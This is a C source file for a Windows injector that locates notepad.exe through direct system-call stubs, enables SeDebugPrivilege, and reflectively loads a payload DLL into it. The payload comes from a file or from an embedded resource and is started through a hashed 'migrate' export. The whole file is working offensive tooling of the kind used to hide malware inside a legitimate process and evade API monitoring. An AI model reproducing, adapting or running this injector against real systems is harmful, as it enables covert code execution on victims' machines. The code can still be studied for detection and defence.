#include "syscalls.h"
#include "helper.h"
#include "ReflectiveDLLInjection.h"
#include "LoadLibraryR.h"
#include "resource.h"

#include <stdio.h>
#include <stdlib.h>
//#include <Windows.h>

#pragma comment(lib, "Advapi32.lib")

#define MIGRATE_HASH		0x68da88da

BOOL FindProcess(IN PCWSTR wszProcessName, IN HANDLE* hProcess, OUT DWORD* dwProcessId)
{
	PSYSTEM_PROCESS_INFORMATION SystemProcInfo = NULL;
	ULONG uSystemProcInfoLen, uReturnLen;
	NTSTATUS status;
	PVOID pValueToFree;

	if ((status = Sw3NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uSystemProcInfoLen)) != STATUS_SUCCESS && status != STATUS_INFO_LENGTH_MISMATCH)
		return FALSE;

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)malloc(uSystemProcInfoLen);

	if ((status = Sw3NtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uSystemProcInfoLen, &uReturnLen)) != STATUS_SUCCESS || uSystemProcInfoLen != uReturnLen)
		return FALSE;

	pValueToFree = SystemProcInfo;

	if (SystemProcInfo)
	{
		while (TRUE)
		{
			if (SystemProcInfo->ImageName.Length && EqualStringsW(SystemProcInfo->ImageName.Buffer, wszProcessName))
			{
				*dwProcessId = (DWORD)SystemProcInfo->UniqueProcessId;
				printf("Found process with PID %d\n", *dwProcessId);
				if ((*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessId)) != NULL)
					return TRUE;
				return FALSE;
			}

			if (SystemProcInfo->NextEntryOffset == 0)
			{
				printf("Could not locate process %ws\n", wszProcessName);
				return FALSE;
			}

			SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
		}
	}
	
	printf("Unknown error!\n");
	return FALSE;
}

BOOL EnablePriv()
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES priv = { 0 };

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);

		CloseHandle(hToken);

		return TRUE;
	}
	return FALSE;
}

int InjectFromFile()
{
	HANDLE hFile = NULL;
	HANDLE hModule = NULL;
	HANDLE hProcess = NULL;
	LPVOID lpBuffer = NULL;
	DWORD dwLength = 0;
	DWORD dwBytesRead = 0;
	DWORD dwProcessId = 0;
	DWORD dwExitCode = 1;
	const char* cpDllFile = "VCmigrate.dll";

	do
	{
		if (!FindProcess(L"notepad.exe", &hProcess, &dwProcessId))
			return 1;

		hFile = CreateFileA(cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
			BREAK_WITH_ERROR("Failed to open the DLL file");

		dwLength = GetFileSize(hFile, NULL);
		if (dwLength == INVALID_FILE_SIZE || dwLength == 0)
			BREAK_WITH_ERROR("Failed to get the DLL file size");

		lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
		if (!lpBuffer)
			BREAK_WITH_ERROR("Failed to get the DLL file size");

		if (ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL) == FALSE)
			BREAK_WITH_ERROR("Failed to alloc a buffer!");

		if (!EnablePriv())
			return 1;

		hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL, MIGRATE_HASH, NULL, 0);
		if (!hModule)
			BREAK_WITH_ERROR("Failed to inject the DLL");

		printf("[+] Injected the '%s' DLL into process %d.\n", cpDllFile, dwProcessId);

		WaitForSingleObject(hModule, -1);

		if (!GetExitCodeThread(hModule, &dwExitCode))
			BREAK_WITH_ERROR("Failed to get exit code of thread");

		printf("[+] Created thread exited with code %d.\n", dwExitCode);

	} while (0);

	if (lpBuffer)
		HeapFree(GetProcessHeap(), 0, lpBuffer);

	if (hProcess)
		CloseHandle(hProcess);

	return dwExitCode;

}

int InjectFromResource()
{
	HRSRC hRsrc = NULL;
	HGLOBAL hGlobal = NULL;
	PVOID pPayloadAddress = NULL;
	SIZE_T sPayloadSize = NULL;
	HANDLE hModule = NULL;
	HANDLE hProcess = NULL;
	DWORD dwProcessId, dwExitCode;

	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL)
	{
		printf("[!] FindResourceW failed with error : %d\n", GetLastError());
		return -1;
	}

	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
	{
		printf("[!] LoadResource failed with error : %d\n", GetLastError());
		return -1;
	}

	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL)
	{
		printf("[!] LockResource failed with error : %d\n", GetLastError());
		return -1;
	}

	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL)
	{
		printf("[!] SizeofResource failed with error : %d\n", GetLastError());
		return -1;
	}

	if (!EnablePriv())
		return 1;

	if (!FindProcess(L"notepad.exe", &hProcess, &dwProcessId))
		return 1;

	hModule = LoadRemoteLibraryR(hProcess, pPayloadAddress, sPayloadSize, NULL, MIGRATE_HASH, NULL, 0);
	if (!hModule)
		return 1;

	printf("[+] Injected the DLL into process %d.\n", dwProcessId);

	WaitForSingleObject(hModule, -1);

	if (!GetExitCodeThread(hModule, &dwExitCode))
		return 1;

	printf("[+] Created thread exited with code %d.\n", dwExitCode);

	return 0;

}

int main(void)
{
	//InjectFromFile();
	InjectFromResource();

	return 0;
}